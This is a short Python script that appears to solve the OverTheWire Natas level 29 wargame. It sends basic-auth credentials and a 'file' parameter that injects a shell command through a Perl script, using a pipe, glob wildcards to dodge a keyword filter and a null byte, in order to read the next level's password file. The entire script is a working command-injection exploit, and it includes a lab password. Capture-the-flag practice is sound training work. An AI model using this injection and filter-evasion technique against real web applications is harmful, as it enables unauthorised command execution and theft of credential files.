import requests
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas29', 'hwgoYUiGWoSZAqphtCAZf7u1jS16KEah')
url = "http://natas29.natas.labs.overthewire.org/index.pl?file=|cat /etc/n?t?s_webp?ss/n?t?s30%00"

r = requests.get(url, auth=basicAuth)

print(r.text)

